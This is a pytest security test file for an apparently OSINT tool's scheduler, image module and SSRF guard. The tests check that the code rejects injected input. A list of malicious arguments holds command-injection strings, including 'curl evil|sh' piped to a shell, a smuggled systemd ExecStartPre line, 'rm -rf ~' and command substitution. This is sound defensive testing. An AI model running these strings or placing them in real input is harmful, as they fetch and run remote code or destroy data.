"""Hermetic security tests for WP-C (SECURITY-CORE).

Covers, with zero network / zero real-filesystem-install side effects:
  * scheduler refuses / escapes a malicious scan target containing shell
    metacharacters, newlines and command substitution;
  * scheduler refuses to silently rescale a non-24-multiple hour cadence and
    refuses to emit a raw cron string as a systemd OnCalendar value;
  * image module refuses a non-image path and a directory, and caps an
    over-25MB URL body without buffering it whole;
  * image reverse-search pivots percent-encode the source URL;
  * the SSRF guard fails CLOSED on a DNS resolution error.
"""
from __future__ import annotations

import struct

import httpx
import pytest

from app.core import http as http_mod
from app.features.scheduler import (
    Schedule,
    render_cron_snippet,
    render_systemd_unit,
)
from app.modules import image as image_mod
from app.modules.image import _MAX_BYTES, _read_local_image, _reverse_pivots

from .factories import make_query

# --------------------------------------------------------------------------- #
# scheduler — target / argument injection                                     #
# --------------------------------------------------------------------------- #

# Each of these, if interpolated raw into a unit/crontab line, is RCE.
_MALICIOUS_ARGS = [
    "x.com\nExecStartPre=/bin/sh -c 'curl evil|sh'",   # systemd directive inject
    "x.com; curl evil.sh|sh",                          # cron shell metachars
    "x.com && rm -rf ~",                               # chained command
    "$(curl evil|sh)",                                 # command substitution
    "`reboot`",                                        # backtick substitution
    "a.com\rb",                                        # carriage-return inject
    "a.com\x00b",                                      # NUL
    "a | b",                                           # pipe + spaces
    "host>file",                                       # redirection
]


@pytest.mark.parametrize("bad", _MALICIOUS_ARGS)
def test_schedule_rejects_malicious_target(bad):
    with pytest.raises(ValueError):
        Schedule(
            name="job",
            osint_bin="/usr/bin/osint",
            command_args=[bad],
            every_hours=6,
        )


@pytest.mark.parametrize("bad", _MALICIOUS_ARGS)
def test_schedule_rejects_malicious_target_as_trailing_arg(bad):
    # Injection through a value after a legitimate first arg must also fail.
    with pytest.raises(ValueError):
        Schedule(
            name="job",
            osint_bin="/usr/bin/osint",
            command_args=["scan", bad],
            every_hours=6,
        )


def test_schedule_accepts_legitimate_targets():
    # Domains, IPs, emails, usernames, hashes, flags — all must pass.
    for args in (
        ["example.com"],
        ["192.168.1.10"],
        ["user@example.com"],
        ["john_doe-99"],
        ["d41d8cd98f00b204e9800998ecf8427e"],
        ["case", "resume", "myslug"],
        ["scan", "--profile", "deep"],
    ):
        Schedule(name="job", osint_bin="/usr/bin/osint",
                 command_args=args, every_hours=6)


def test_systemd_execstart_is_shlex_quoted():
    # A '+'-bearing handle and an '=' flag must render as single shell tokens.
    s = Schedule(name="job", osint_bin="/opt/my osint/bin",
                 command_args=["scan", "--profile=deep"], every_hours=6)
    service, _timer = render_systemd_unit(s)
    line = next(ln for ln in service.splitlines() if ln.startswith("ExecStart="))
    # The path contains a space, so it MUST be quoted (no bare space split).
    assert "'/opt/my osint/bin'" in line
    # No injected newline reached the unit.
    assert service.count("ExecStart=") == 1


def test_cron_snippet_quotes_args():
    s = Schedule(name="job", osint_bin="/usr/bin/osint",
                 command_args=["scan", "--profile", "deep"], every_hours=6)
    snippet = render_cron_snippet(s)
    # Exactly two lines: comment + the schedule line, nothing injected.
    body = [ln for ln in snippet.splitlines() if ln and not ln.startswith("#")]
    assert len(body) == 1
    assert ";" not in body[0] and "|" not in body[0] and "&" not in body[0]


# --------------------------------------------------------------------------- #
# scheduler — cron expression validation + translation                        #
# --------------------------------------------------------------------------- #

def test_cron_expr_rejects_newline():
    with pytest.raises(ValueError):
        Schedule(name="job", osint_bin="/usr/bin/osint",
                 command_args=["scan"],
                 cron_expr="0 3 * * *\nExecStartPre=/bin/sh -c 'curl evil|sh'")


def test_cron_expr_rejects_shell_metachars():
    with pytest.raises(ValueError):
        Schedule(name="job", osint_bin="/usr/bin/osint",
                 command_args=["scan"], cron_expr="0 3 * * *; reboot")


def test_systemd_translates_cron_to_oncalendar():
    s = Schedule(name="job", osint_bin="/usr/bin/osint",
                 command_args=["scan"], cron_expr="30 3 * * *")
    _service, timer = render_systemd_unit(s)
    # Must be a valid OnCalendar form, NOT the raw cron string.
    assert "OnCalendar=*-*-* 03:30:00" in timer
    assert "OnCalendar=30 3 * * *" not in timer


def test_systemd_translates_cron_dow():
    s = Schedule(name="job", osint_bin="/usr/bin/osint",
                 command_args=["scan"], cron_expr="0 9 * * 1")
    _service, timer = render_systemd_unit(s)
    assert "OnCalendar=Mon *-*-* 09:00:00" in timer


def test_systemd_refuses_untranslatable_cron():
    # Step/range fields aren't translatable → must raise, never emit raw cron.
    s = Schedule(name="job", osint_bin="/usr/bin/osint",
                 command_args=["scan"], cron_expr="*/15 * * * *")
    with pytest.raises(ValueError):
        render_systemd_unit(s)


# --------------------------------------------------------------------------- #
# scheduler — every_hours integer-division bug                                #
# --------------------------------------------------------------------------- #

def test_cron_snippet_rejects_non_multiple_over_24():
    # 25h used to collapse to "*/1 * * *" (daily) silently — must now raise.
    for h in (25, 30, 36):
        s = Schedule(name="job", osint_bin="/usr/bin/osint",
                     command_args=["scan"], every_hours=h)
        with pytest.raises(ValueError):
            render_cron_snippet(s)


def test_cron_snippet_multiple_of_24_ok():
    s = Schedule(name="job", osint_bin="/usr/bin/osint",
                 command_args=["scan"], every_hours=48)
    snippet = render_cron_snippet(s)
    assert "0 0 */2 * *" in snippet


# --------------------------------------------------------------------------- #
# image — local-file read confinement                                         #
# --------------------------------------------------------------------------- #

def test_image_refuses_non_image_path(tmp_path):
    # A real, readable, regular file that is NOT an image (e.g. a secret).
    secret = tmp_path / "passwd"
    secret.write_text("root:x:0:0:root:/root:/bin/sh\n")
    ok, payload, err = _read_local_image(str(secret))
    assert ok is False
    assert payload == b""
    assert "not an image" in err
    # And the resolved absolute path must NOT be echoed back.
    assert str(secret) not in err


def test_image_refuses_directory(tmp_path):
    d = tmp_path / "imgs.jpg"  # image extension but it's a directory
    d.mkdir()
    ok, payload, err = _read_local_image(str(d))
    assert ok is False
    assert payload == b""
    assert "regular file" in err or "not an image" in err


def test_image_refuses_missing_path(tmp_path):
    ok, payload, err = _read_local_image(str(tmp_path / "nope.jpg"))
    assert ok is False
    assert "does not exist" in err


def test_image_refuses_oversize_local_file(tmp_path):
    big = tmp_path / "huge.jpg"
    # Sparse file > 25MB without writing 25MB of data.
    with open(big, "wb") as f:
        f.seek(_MAX_BYTES + 1)
        f.write(b"\0")
    ok, payload, err = _read_local_image(str(big))
    assert ok is False
    assert "too large" in err


def test_image_reads_small_image(tmp_path):
    img = tmp_path / "real.jpg"
    img.write_bytes(b"\xff\xd8\xff\xd9")  # tiny valid-ish JPEG
    ok, payload, err = _read_local_image(str(img))
    assert ok is True
    assert payload == b"\xff\xd8\xff\xd9"
    assert err == ""


# --------------------------------------------------------------------------- #
# image — URL fetch caps the body BEFORE buffering it whole                   #
# --------------------------------------------------------------------------- #

def _patch_client(monkeypatch, handler):
    client = httpx.AsyncClient(transport=httpx.MockTransport(handler), timeout=5.0)

    async def _fake_get_client() -> httpx.AsyncClient:
        return client

    monkeypatch.setattr("app.core.http.get_client", _fake_get_client)
    monkeypatch.setattr(image_mod, "get_client", _fake_get_client, raising=False)


async def _consume(agen):
    return [h async for h in agen]


async def test_image_fetch_caps_oversize_body(monkeypatch):
    # Server STREAMS ~30MB with NO Content-Length (chunked) → the streaming
    # guard must stop at the cap and never buffer/return more than _MAX_BYTES.
    chunk_count = {"n": 0}

    async def _stream():
        # First chunk has the JPEG SOI so content-type sniffing is moot.
        yield b"\xff\xd8"
        for _ in range(40):  # 40 x 1MB = 40MB if fully drained
            chunk_count["n"] += 1
            yield b"A" * (1024 * 1024)

    def handler(request: httpx.Request) -> httpx.Response:
        return httpx.Response(200, headers={"content-type": "image/jpeg"},
                              content=_stream())

    _patch_client(monkeypatch, handler)
    payload, err = await image_mod._fetch_url("https://host/big.jpg")
    assert err == ""
    assert len(payload) <= _MAX_BYTES
    # And we must have stopped early — NOT drained all 40 chunks into RAM.
    assert chunk_count["n"] <= (_MAX_BYTES // (1024 * 1024)) + 2


async def test_image_fetch_rejects_declared_oversize(monkeypatch):
    # An honest server that declares an over-cap Content-Length is rejected
    # before any body is pulled.
    def handler(request: httpx.Request) -> httpx.Response:
        return httpx.Response(
            200,
            headers={"content-type": "image/jpeg",
                     "content-length": str(_MAX_BYTES + 5_000_000)},
            content=b"\xff\xd8" + b"B" * 10,
        )

    _patch_client(monkeypatch, handler)
    payload, err = await image_mod._fetch_url("https://host/big.jpg")
    assert payload == b""
    assert "too large" in err


# --------------------------------------------------------------------------- #
# image — pivot URL percent-encoding                                          #
# --------------------------------------------------------------------------- #

def test_reverse_pivots_percent_encode_source():
    src = "https://x.com/a.jpg?token=ab&x=1#frag"
    pivots = _reverse_pivots(src)
    for _engine, url, _detail in pivots:
        # The raw '&', '#', '?' from the source must NOT leak into the outer
        # query/fragment — they must be percent-encoded.
        assert "&x=1" not in url
        assert "#frag" not in url
        assert "%26" in url or "%3F" in url or "%23" in url


# --------------------------------------------------------------------------- #
# image — EXIF parser hardening                                               #
# --------------------------------------------------------------------------- #

def test_parse_exif_truncated_app1_segment():
    # Crafted JPEG whose APP1 declares a seg_len running past the buffer; must
    # return {} (or no GPS), never raise / loop.
    payload = b"\xff\xd8" + b"\xff\xe1" + struct.pack(">H", 0xFFFF) + b"Exif\x00\x00"
    assert image_mod.parse_exif(payload) == {}


def test_parse_exif_zero_seglen_does_not_loop():
    payload = b"\xff\xd8" + b"\xff\xe1" + struct.pack(">H", 0) + b"junk"
    assert image_mod.parse_exif(payload) == {}


def test_read_value_rejects_absurd_count():
    # A 0xFFFFFFFF count must not trigger a multi-MB allocation — rejected.
    bo = "<"
    blob = bytearray(b"II" + struct.pack("<H", 0x002A) + struct.pack("<I", 8))
    entry = struct.pack(bo + "HHI", 0x010F, 3, 0xFFFFFFFF) + struct.pack(bo + "I", 8)
    blob += entry
    rec = image_mod._read_value(bytes(blob), 8, len(blob) - 12, bo)
    assert rec is None


async def test_image_run_local_non_image_emits_no_data(monkeypatch, tmp_path):
    # End-to-end: forcing kind=image on a non-image local path must NOT read
    # it — the module emits a non-FOUND hit and never echoes file contents.
    secret = tmp_path / "id_rsa"
    secret.write_text("-----BEGIN PRIVATE KEY-----\nAAAA\n")
    from app.core.types import HitStatus, QueryKind
    q = make_query(str(secret), kind=QueryKind.IMAGE)
    hits = await _consume(image_mod.run(q))
    # No FOUND hits sourced from the file content.
    found = [h for h in hits if h.status == HitStatus.FOUND]
    assert found == []


# --------------------------------------------------------------------------- #
# SSRF guard — fail CLOSED on resolution error                                #
# --------------------------------------------------------------------------- #

async def test_ssrf_guard_fails_closed_on_resolution_error(monkeypatch):
    monkeypatch.delenv("OSINT_OPSEC", raising=False)
    monkeypatch.delenv("OSINT_ALLOW_PRIVATE", raising=False)
    http_mod._resolve_cache.clear()

    class _Loop:
        async def getaddrinfo(self, host, port):
            raise OSError("name resolution failed")

    monkeypatch.setattr(http_mod.asyncio, "get_running_loop", lambda: _Loop())

    blocked = await http_mod._host_blocked("definitely-not-resolvable.invalid")
    assert blocked is True
    # The failure must NOT be cached (it may be transient).
    assert "definitely-not-resolvable.invalid" not in http_mod._resolve_cache


async def test_ssrf_guard_caches_with_ttl(monkeypatch):
    monkeypatch.delenv("OSINT_OPSEC", raising=False)
    monkeypatch.delenv("OSINT_ALLOW_PRIVATE", raising=False)
    http_mod._resolve_cache.clear()

    class _Loop:
        async def getaddrinfo(self, host, port):
            return [(0, 0, 0, "", ("93.184.216.34", 0))]  # public IP

    monkeypatch.setattr(http_mod.asyncio, "get_running_loop", lambda: _Loop())
    blocked = await http_mod._host_blocked("example.com")
    assert blocked is False
    # Cached as (blocked, expires_at) — a tuple with a TTL, not a bare bool.
    entry = http_mod._resolve_cache.get("example.com")
    assert entry is not None and entry[0] is False
    assert isinstance(entry[1], float) and entry[1] > 0


async def test_ssrf_guard_blocks_metadata_ip(monkeypatch):
    monkeypatch.delenv("OSINT_OPSEC", raising=False)
    monkeypatch.delenv("OSINT_ALLOW_PRIVATE", raising=False)
    # Literal cloud-metadata IP — blocked without any DNS lookup.
    assert await http_mod._host_blocked("169.254.169.254") is True
    assert await http_mod._host_blocked("127.0.0.1") is True
